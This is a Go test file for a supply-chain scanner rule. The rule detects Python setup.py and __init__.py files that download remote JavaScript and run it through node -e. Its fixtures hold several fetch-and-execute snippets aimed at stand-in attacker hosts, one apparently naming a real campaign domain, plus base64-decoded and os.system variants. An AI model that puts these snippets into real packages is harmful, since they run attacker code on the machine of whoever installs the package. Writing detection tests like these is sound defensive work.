package pyrisk

import (
	"context"
	"testing"

	"github.com/garagon/aguara/internal/scanner"
)

func analyze(t *testing.T, name, src string) []scanner.Finding {
	t.Helper()
	a := New()
	f, err := a.Analyze(context.Background(), &scanner.Target{RelPath: name, Content: []byte(src)})
	if err != nil {
		t.Fatalf("analyze: %v", err)
	}
	return f
}

func fires(t *testing.T, name, src string) bool {
	t.Helper()
	for _, f := range analyze(t, name, src) {
		if f.RuleID == RulePyImportTimeRemoteJS {
			return true
		}
	}
	return false
}

func TestTruePositives(t *testing.T) {
	cases := []struct{ name, src string }{
		{
			"fetch js -> var -> node -e var",
			`import requests, subprocess
js = requests.get("https://evil.example/risk-profiler.js").text
subprocess.run(["node", "-e", js])`,
		},
		{
			"urllib js -> var -> node -e var (campaign host)",
			`import urllib.request, subprocess
payload = urllib.request.urlopen("https://ddjidd564.github.io/defi-security-best-practices/x.js").read()
subprocess.run(["node", "-e", payload])`,
		},
		{
			"fetch js -> simple transform -> node --eval",
			`import httpx, base64, subprocess
raw = httpx.get("https://evil.example/p.js?v=2").text
code = base64.b64decode(raw).decode()
subprocess.run(["node", "--eval", code])`,
		},
		{
			"os.system shell concat form",
			`import requests, os
payload = requests.get("https://evil.example/p.js").text
os.system("node -e " + payload)`,
		},
		{
			"js url in a variable, then fetched",
			`import requests, subprocess
url = "https://evil.example/loader.js"
js = requests.get(url).text
subprocess.run(["node", "-e", js])`,
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if !fires(t, "setup.py", c.src) {
				t.Fatalf("expected PY_IMPORTTIME_REMOTE_JS_001 to fire")
			}
		})
	}
}

func TestIndentedAssignmentsBind(t *testing.T) {
	// The source assignment is commonly indented (inside try:, a
	// function, a with-block) in setup.py / __init__.py. Indentation
	// must not break the fetch->eval binding.
	cases := []struct{ name, src string }{
		{
			"inside try/except",
			`import requests, subprocess
try:
    js = requests.get("https://evil.example/p.js").text
    subprocess.run(["node", "-e", js])
except Exception:
    pass`,
		},
		{
			"inside a function body",
			`import requests, subprocess
def run():
    js = requests.get("https://evil.example/p.js").text
    subprocess.run(["node", "-e", js])
run()`,
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if !fires(t, "__init__.py", c.src) {
				t.Fatalf("indented assignment must still bind and fire")
			}
		})
	}
}

func TestFalsePositives(t *testing.T) {
	cases := []struct{ name, src string }{
		{
			"fetch .js but node runs a local file (no -e)",
			`import requests, subprocess
js = requests.get("https://cdn.example/foo.js").text
subprocess.run(["node", "scripts/build.js"])`,
		},
		{
			"fetch config.json + node -e (source not JS)",
			`import requests, subprocess
cfg = requests.get("https://example.com/config.json").text
subprocess.run(["node", "-e", cfg])`,
		},
		{
			"node -e with an unrelated variable",
			`import requests, subprocess
js = requests.get("https://evil.example/p.js").text
banner = "console.log('hi')"
subprocess.run(["node", "-e", banner])`,
		},
		{
			"commented-out fetch + node -e",
			`import subprocess
# js = requests.get("https://evil.example/p.js").text
# subprocess.run(["node", "-e", js])
print("ok")`,
		},
		{
			"docstring describing the technique",
			`"""
Example: js = requests.get("https://evil.example/p.js").text
then subprocess.run(["node", "-e", js])
"""
import os
print("safe")`,
		},
		{
			"node build.js only, no fetch",
			`import subprocess
subprocess.run(["node", "build.js"])`,
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if fires(t, "setup.py", c.src) {
				t.Fatalf("expected NO finding")
			}
		})
	}
}

func TestPrecisionOnlyTargetFiles(t *testing.T) {
	// The exact malicious shape in a non-target file must not fire: the
	// analyzer only inspects install/import-time entry points.
	src := `import requests, subprocess
js = requests.get("https://evil.example/p.js").text
subprocess.run(["node", "-e", js])`
	if fires(t, "utils.py", src) {
		t.Fatal("must not fire on utils.py (only setup.py / __init__.py are targets)")
	}
	if !fires(t, "__init__.py", src) {
		t.Fatal("must fire on __init__.py")
	}
}
